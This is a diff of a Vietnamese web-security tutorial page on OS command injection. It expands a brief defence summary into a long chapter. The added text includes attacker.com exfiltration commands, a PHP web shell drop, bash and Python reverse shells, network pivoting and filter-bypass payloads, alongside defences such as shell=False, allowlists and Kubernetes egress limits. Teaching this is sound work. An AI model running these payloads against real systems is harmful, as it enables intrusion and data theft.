@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Chương 14: Command Injection — Hieu Nguyen</title>
-  <meta name="description" content="OS command injection, subprocess list, no shell, least privilege.">
+  <meta name="description" content="Chương 14: Command Injection — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,58 +40,385 @@
         <span>›</span>
         <span>14. Command Injection</span>
       </div>
-      <h1>Chương 14: Command Injection</h1>
-      <p class="lede">App gọi shell với string có user input. OS làm phần còn lại.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> IV — Injection</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>Command injection khi ghép lệnh OS từ input (ping host, convert file). Metacharacter shell biến một tham số thành nhiều lệnh. Không cần liệt kê payload để biết: đừng gọi shell.</p>
-<h2 id="phong">Phòng chống</h2>
-<ol>
-        <li>Đừng gọi OS — dùng library.</li>
-        <li>Bắt buộc: exec mảng argument, <code>shell=False</code>.</li>
-        <li>Allowlist giá trị (enum), không blacklist ký tự.</li>
-        <li>Process / container non-root, không mount docker.sock.</li>
-      </ol>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Pod: drop ALL caps, readOnlyRootFilesystem, không privileged. Seccomp. Egress DNS/HTTP siết — giảm impact nếu code còn gọi nhầm.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Không shell=True.</li>
-        <li>Allowlist.</li>
-        <li>Least privilege container.</li>
-        <li>Không docker.sock trong app Pod.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>shell=True khác list args?</li>
-        <li>Blacklist khoảng trắng đủ không?</li>
-        <li>Capability nào nên drop?</li>
-        <li>Vì sao ping-from-form là mùi?</li>
-        <li>Egress policy giảm gì sau khi bị inject?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 14: Command Injection</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>Command Injection</strong> (OS Command Injection — Tiêm lệnh OS) là lỗ hổng cho phép hacker thực thi arbitrary OS commands trên server bằng cách inject vào user input được truyền vào shell commands.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Rất cao — Command injection = full server compromise. Hacker có thể đọc files, tạo backdoors, pivot sang internal network.</p>
+<p>Xảy ra khi application gọi OS commands với unsanitized user input.</p>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-python"># Vulnerable code: ping một IP do user nhập
+def ping_host(ip_address):
+    result = os.system(f&quot;ping -c 1 {ip_address}&quot;)
+    return result
 
-      <div class="docs-tags">
-        <span class="docs-tag">command-injection</span>
-        <span class="docs-tag">rce</span>
-        <span class="docs-tag">devops</span>
-      </div>
+# Normal: ip_address = &quot;8.8.8.8&quot;
+# Command: ping -c 1 8.8.8.8
+
+# Attack: ip_address = &quot;8.8.8.8; cat /etc/passwd&quot;
+# Command: ping -c 1 8.8.8.8; cat /etc/passwd
+# → Ping thành công, sau đó đọc /etc/passwd
+</code></pre>
+<hr>
+<h2 id="shell-metacharacters--vũ-khí-tấn-công">Shell Metacharacters — Vũ khí tấn công</h2>
+<pre><code class="language-text">;     Chạy command tiếp theo
+&amp;&amp;    Chạy command tiếp theo NẾU command trước thành công
+||    Chạy command tiếp theo NẾU command trước THẤT BẠI
+|     Pipe output sang command kế tiếp
+`     Backtick: thực thi command và thay bằng output
+$()   Command substitution: $(command)
+\n    Newline: command mới trên dòng mới
+
+Ví dụ:
+8.8.8.8; id
+8.8.8.8 &amp;&amp; id
+8.8.8.8 | id
+8.8.8.8 `id`
+8.8.8.8 $(id)
+</code></pre>
+<hr>
+<h2 id="các-loại-command-injection">Các loại Command Injection</h2>
+<h3 id="1-in-band-direct--output-hiển-thị-trong-response">1. In-Band (Direct) — Output hiển thị trong response</h3>
+<pre><code class="language-text">Input: 127.0.0.1; cat /etc/passwd
+Output hiển thị trực tiếp:
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+...
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+</code></pre>
+<h3 id="2-blind-command-injection--không-có-output">2. Blind Command Injection — Không có output</h3>
+<p>Phổ biến hơn in-band. App thực thi command nhưng không hiển thị kết quả.</p>
+<p><strong>Time-based detection:</strong></p>
+<pre><code class="language-bash"># Nếu command thực thi, sẽ delay response
+ping -c 1 127.0.0.1; sleep 10
+127.0.0.1 &amp; sleep 10 &amp;
+127.0.0.1 &amp;&amp; sleep 10
+127.0.0.1 | sleep 10
+
+# Nếu response chậm hơn 10 giây → command injection confirmed
+</code></pre>
+<p><strong>Output redirection:</strong></p>
+<pre><code class="language-bash"># Redirect output vào web-accessible file
+127.0.0.1; id &gt; /var/www/html/output.txt
+# Sau đó: curl https://example.com/output.txt
+
+127.0.0.1; cat /etc/passwd &gt; /var/www/html/passwd.txt
+</code></pre>
+<p><strong>Out-of-Band (OAST) — Dùng DNS/HTTP:</strong></p>
+<pre><code class="language-bash"># Trigger DNS lookup đến domain hacker kiểm soát
+127.0.0.1; nslookup `id`.attacker.com
+# → DNS query: uid=33(www-data).attacker.com → biết command chạy với quyền gì
+
+# Curl để exfiltrate data
+127.0.0.1; curl https://attacker.com/$(whoami)
+127.0.0.1; curl https://attacker.com/data --data @/etc/passwd
+
+# Ping
+127.0.0.1; ping -c 1 $(hostname).attacker.com
+</code></pre>
+<h3 id="3-time-based-blind-injection">3. Time-Based Blind Injection</h3>
+<pre><code class="language-bash"># Phân tích timing để extract data từng bit
+
+# Nếu user là root → sleep 5 giây
+; if [ &quot;$(whoami)&quot; = &quot;root&quot; ]; then sleep 5; fi
+
+# Extract file content ký tự một:
+; if [ &quot;$(cut -c1 /etc/passwd)&quot; = &quot;r&quot; ]; then sleep 3; fi
+# Delay → ký tự đầu là &#x27;r&#x27;
+
+; if [ &quot;$(cut -c2 /etc/passwd)&quot; = &quot;o&quot; ]; then sleep 3; fi
+# Delay → ký tự 2 là &#x27;o&#x27;
+</code></pre>
+<hr>
+<h2 id="khai-thác-thực-tế">Khai thác thực tế</h2>
+<h3 id="web-shell-upload-qua-command-injection">Web Shell Upload qua Command Injection</h3>
+<pre><code class="language-bash"># Tạo persistent backdoor
+127.0.0.1; echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; /var/www/html/shell.php
+
+# Bây giờ:
+curl &quot;https://example.com/shell.php?cmd=id&quot;
+# → uid=33(www-data) gid=33(www-data)
+
+curl &quot;https://example.com/shell.php?cmd=cat+/etc/passwd&quot;
+# → Full /etc/passwd
+
+curl &quot;https://example.com/shell.php?cmd=ls+-la+/&quot;
+</code></pre>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<pre><code class="language-bash"># Attacker lắng nghe trên port 4444
+nc -lvnp 4444
+
+# Inject reverse shell vào target
+127.0.0.1; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+
+# Hoặc Python:
+127.0.0.1; python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attacker.com&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;
+</code></pre>
+<h3 id="internal-network-pivot">Internal Network Pivot</h3>
+<pre><code class="language-bash"># Sau khi có shell trên server:
+# Scan internal network
+127.0.0.1; for i in 10.0.0.{1..254}; do (ping -c1 $i 2&gt;&amp;1 &gt;/dev/null &amp;&amp; echo &quot;UP: $i&quot;)&amp; done; wait
+
+# Scan specific port
+127.0.0.1; for i in 10.0.0.{1..10}; do nc -zv $i 22 2&gt;&amp;1; done
+
+# Pivot đến database
+127.0.0.1; mysql -h 10.0.0.5 -u root -p&#x27;password&#x27; -e &quot;SHOW DATABASES;&quot;
+</code></pre>
+<hr>
+<h2 id="bypass-techniques">Bypass Techniques</h2>
+<h3 id="bypass-spaces">Bypass Spaces</h3>
+<pre><code class="language-bash"># Nếu space bị filter
+${IFS}        # Internal Field Separator = space by default
+$&#x27;\x20&#x27;       # Hex space
+{cat,/etc/passwd}  # No space needed
+cat&lt;/etc/passwd    # Redirect without space
+X=$&#x27;cat\x20/etc/passwd&#x27;&amp;&amp;$X
+</code></pre>
+<h3 id="bypass-blacklisted-keywords">Bypass Blacklisted Keywords</h3>
+<pre><code class="language-bash"># &quot;cat&quot; bị filter
+c&#x27;a&#x27;t /etc/passwd
+c${u}at /etc/passwd
+ca\t /etc/passwd
+$(printf &#x27;\143\141\164&#x27;) /etc/passwd  # &#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27; in octal
+/bin/c?t /etc/passwd   # Wildcard
+
+# &quot;passwd&quot; bị filter
+/etc/pa??wd
+/etc/pass&#x27;wd&#x27;
+</code></pre>
+<h3 id="url-encoding">URL Encoding</h3>
+<pre><code class="language-text">Thường encode qua Burp Decoder:
+; → %3B
+| → %7C
+&amp; → %26
+$ → %24
+( → %28
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Tìm features liên quan đến OS commands:
+  - Ping/traceroute tools
+  - File conversion tools
+  - PDF/image generation
+  - Network diagnostic tools
+  - Backup/archive features
+
+□ Test với time delay: ; sleep 10
+□ Test với out-of-band: ; nslookup attacker.com
+□ Kiểm tra Burp Collaborator nếu có Pro
+
+□ Test variations:
+  ; id
+  &amp;&amp; id
+  | id
+  `id`
+  $(id)
+  || id
+  %0a id    (newline)
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-tránh-gọi-os-commands--best-practice">1. Tránh gọi OS commands — Best Practice</h3>
+<pre><code class="language-python"># SAI: Gọi ping command
+import os
+def ping(ip):
+    return os.system(f&quot;ping -c 1 {ip}&quot;)
+
+# ĐÚNG: Dùng Python library thay thế
+import subprocess
+import ipaddress
+
+def ping(ip):
+    # Validate IP trước
+    try:
+        ipaddress.ip_address(ip)  # Validate IP format
+    except ValueError:
+        raise ValueError(&quot;Invalid IP address&quot;)
+    
+    # Dùng list argument thay vì shell string
+    result = subprocess.run(
+        [&quot;ping&quot;, &quot;-c&quot;, &quot;1&quot;, ip],  # List, không phải string
+        capture_output=True,
+        text=True,
+        timeout=5,
+        shell=False  # QUAN TRỌNG: shell=False
+    )
+    return result.stdout
+</code></pre>
+<h3 id="2-shellfalse-subprocess-với-list-arguments">2. Shell=False (subprocess với list arguments)</h3>
+<pre><code class="language-python">import subprocess
+
+# SAI: shell=True với string → dễ inject
+def run_command(user_input):
+    result = subprocess.run(
+        f&quot;echo {user_input}&quot;,
+        shell=True,  # ← NGUY HIỂM
+        capture_output=True
+    )
+
+# ĐÚNG: shell=False với list
+def run_command(user_input):
+    # Validate first
+    if not re.match(r&#x27;^[a-zA-Z0-9 ]+$&#x27;, user_input):
+        raise ValueError(&quot;Invalid input&quot;)
+    
+    result = subprocess.run(
+        [&quot;echo&quot;, user_input],  # List: each element is a separate argument
+        shell=False,           # Shell not invoked → metacharacters not interpreted
+        capture_output=True,
+        text=True,
+        timeout=5
+    )
+    return result.stdout
+</code></pre>
+<h3 id="3-input-validation--strict-whitelist">3. Input Validation — Strict Whitelist</h3>
+<pre><code class="language-python">import re
+import ipaddress
+
+def validate_ip(ip: str) -&gt; str:
+    &quot;&quot;&quot;Chỉ accept valid IPv4/IPv6 addresses&quot;&quot;&quot;
+    try:
+        return str(ipaddress.ip_address(ip))
+    except ValueError:
+        raise ValueError(f&quot;Invalid IP address: {ip}&quot;)
+
+def validate_hostname(hostname: str) -&gt; str:
+    &quot;&quot;&quot;Chỉ accept valid hostnames&quot;&quot;&quot;
+    pattern = r&#x27;^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$&#x27;
+    if not re.match(pattern, hostname):
+        raise ValueError(f&quot;Invalid hostname: {hostname}&quot;)
+    return hostname
+
+def validate_filename(filename: str) -&gt; str:
+    &quot;&quot;&quot;Chỉ accept safe filenames&quot;&quot;&quot;
+    # Chỉ cho phép alphanumeric, dash, underscore, dot
+    if not re.match(r&#x27;^[a-zA-Z0-9_\-\.]+$&#x27;, filename):
+        raise ValueError(f&quot;Invalid filename: {filename}&quot;)
+    # Không cho phép path traversal
+    if &#x27;..&#x27; in filename or &#x27;/&#x27; in filename:
+        raise ValueError(&quot;Path traversal not allowed&quot;)
+    return filename
+</code></pre>
+<h3 id="4-least-privilege-cho-process">4. Least Privilege cho Process</h3>
+<pre><code class="language-dockerfile"># Dockerfile: chạy app với user không có quyền cao
+FROM python:3.11-slim
+
+# Tạo non-root user
+RUN groupadd -r appuser &amp;&amp; useradd -r -g appuser appuser
+
+# Switch sang non-root user
+USER appuser
+
+# App chạy với quyền của appuser
+# Ngay cả khi có command injection, thiệt hại bị giới hạn
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Kubernetes: Hạn chế capabilities của container:</strong></p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+    - name: app
+      securityContext:
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: true  # Không ghi được → shell upload khó hơn
+        capabilities:
+          drop:
+            - ALL  # Drop tất cả Linux capabilities
+</code></pre>
+<p><strong>Network Policy — Hạn chế outbound connections:</strong></p>
+<pre><code class="language-yaml"># Ngăn container kết nối ra ngoài (limit reverse shell)
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-egress
+spec:
+  podSelector:
+    matchLabels:
+      app: webapp
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - podSelector:
+            matchLabels:
+              app: database
+      ports:
+        - protocol: TCP
+          port: 5432
+    # Chỉ allow kết nối đến database, không có gì khác
+</code></pre>
+<p><strong>SAST để detect command injection:</strong></p>
+<pre><code class="language-bash"># Semgrep rules
+semgrep --config=p/command-injection src/
+
+# Bandit cho Python
+bandit -r . -t B602,B603,B604,B605,B606,B607
+
+# Tìm os.system, os.popen, subprocess với shell=True
+grep -rn &quot;os\.system\|os\.popen\|shell=True&quot; src/
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>Command injection = inject OS commands vào user input được truyền vào shell.</li>
+<li>Blind injection phổ biến hơn: detect qua time delay hoặc out-of-band (DNS).</li>
+<li>Metacharacters: <code>;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, backtick, <code>$()</code> là công cụ tấn công.</li>
+<li>Phòng chống #1: Tránh gọi OS commands — dùng library thay thế.</li>
+<li>Nếu phải gọi commands: <code>shell=False</code> + list arguments + whitelist validation.</li>
+<li>Least privilege: chạy app với non-root user, drop capabilities.</li>
+<li>Network policy hạn chế outbound giảm impact của reverse shell.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Sự khác nhau giữa in-band và blind command injection là gì? Loại nào phổ biến hơn?</li>
+<li>Tại sao <code>subprocess.run([&quot;cmd&quot;, arg], shell=False)</code> an toàn hơn <code>shell=True</code>?</li>
+<li>Mô tả ba kỹ thuật phát hiện blind command injection.</li>
+<li>Nếu hacker có command injection nhưng app chạy với user giới hạn quyền, impact như thế nào?</li>
+<li>Làm thế nào Network Policy trong Kubernetes giới hạn impact của command injection?</li>
+</ol>
       <div class="docs-pager">
         <a href="../13/">Previous · 13. NoSQLi</a>
-        <a href="../15/">Next · 15. SSRF</a>
+        <a href="../16/">Next · 16. XXE</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#shell-metacharacters--vũ-khí-tấn-công">Shell Metacharacters — Vũ khí tấn công</a>
+        <a href="#các-loại-command-injection">Các loại Command Injection</a>
+        <a class="depth-3" href="#1-in-band-direct--output-hiển-thị-trong-response">1. In-Band (Direct) — Output hiển thị trong response</a>
+        <a class="depth-3" href="#2-blind-command-injection--không-có-output">2. Blind Command Injection — Không có output</a>
+        <a class="depth-3" href="#3-time-based-blind-injection">3. Time-Based Blind Injection</a>
+        <a href="#khai-thác-thực-tế">Khai thác thực tế</a>
+        <a class="depth-3" href="#web-shell-upload-qua-command-injection">Web Shell Upload qua Command Injection</a>
+        <a class="depth-3" href="#reverse-shell">Reverse Shell</a>
+        <a class="depth-3" href="#internal-network-pivot">Internal Network Pivot</a>
+        <a href="#bypass-techniques">Bypass Techniques</a>
+        <a class="depth-3" href="#bypass-spaces">Bypass Spaces</a>
+        <a class="depth-3" href="#bypass-blacklisted-keywords">Bypass Blacklisted Keywords</a>
+        <a class="depth-3" href="#url-encoding">URL Encoding</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-tránh-gọi-os-commands--best-practice">1. Tránh gọi OS commands — Best Practice</a>
+        <a class="depth-3" href="#2-shellfalse-subprocess-với-list-arguments">2. Shell=False (subprocess với list arguments)</a>
+        <a class="depth-3" href="#3-input-validation--strict-whitelist">3. Input Validation — Strict Whitelist</a>
+        <a class="depth-3" href="#4-least-privilege-cho-process">4. Least Privilege cho Process</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
